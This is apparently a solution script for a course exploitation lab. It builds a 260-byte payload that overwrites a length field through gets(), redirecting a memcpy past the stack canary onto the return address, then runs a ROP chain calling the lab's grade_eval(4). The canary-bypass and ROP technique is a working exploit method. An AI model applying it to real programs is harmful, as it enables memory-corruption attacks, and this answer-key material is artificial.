#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (绕过 Canary).

dark-log 开启了 Stack Protector：局部变量与保存的返回地址之间插入了
Canary（位于 rbp-0x8），函数返回前校验。直接溢出到返回地址会先踩掉
Canary 导致 __stack_chk_fail。

但 input() 自身的代码提供了绕过手段：

    struct log_frame {          // 实际栈布局（相对 rbp）
        char expression[128];   // rbp-0x120
        char logMsg[128];       // rbp-0xa0
        int  len;               // rbp-0x20
        char pad[8];            // rbp-0x1c
    };                          // canary 在 rbp-0x8

    f.len = 0;
    gets(f.expression);                       // 溢出可改写 f.len
    memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));

memcpy 的目标地址是 f.logMsg + f.len。用 gets 把 f.len 改写为 160
（= 0xa0，恰为 f.logMsg 到 rbp 的偏移），memcpy 就会把 expression 的
前 128 字节写到 [rbp, rbp+128)：直接覆盖保存的 rbp 和返回地址，
而 Canary（rbp-0x8）位于 memcpy 目标区间的下方，完全不被触碰，
校验自然通过。被写入的 128 字节前 40 字节即为 ROP 链：

    [rbp+0]  填充（覆盖保存的 rbp）
    [rbp+8]  pop rdi; ret   （0x4018a3，藏在 pop r15; ret 中）
    [rbp+16] 4              （grade_eval 的参数）
    [rbp+24] ret            （0x4018a4，栈对齐）
    [rbp+32] grade_eval     （0x401677）

栈对齐原理与 dark-calc-nx 的 ROP 任务相同。
"""
import sys


def p64(x: int) -> bytes:
    return x.to_bytes(8, "little")


def p32(x: int) -> bytes:
    return x.to_bytes(4, "little")


POP_RDI_RET = 0x4018A3   # 5f c3:  popq %rdi; retq
RET = 0x4018A4           # c3:     retq（用于栈对齐）
GRADE_EVAL = 0x401677    # dark-log 中 grade_eval 的地址

# memcpy 会把 input 的前 128 字节复制到 [rbp, rbp+128)
chain = p64(0)              # 覆盖保存的 rbp（值无所谓）
chain += p64(POP_RDI_RET)   # input() 的返回地址 -> pop rdi; ret
chain += p64(4)             # rdi = 4
chain += p64(RET)           # 栈对齐
chain += p64(GRADE_EVAL)    # 调用 grade_eval(4)
chain = chain.ljust(128, b"\x00")

payload = chain
payload += b"A" * 128       # 填满 f.logMsg（rbp-0xa0 .. rbp-0x20）
payload += p32(160)         # 改写 f.len = 160，使 memcpy 目标 = rbp

assert len(payload) == 260 and b"\x0a" not in payload

sys.stdout.buffer.write(payload)
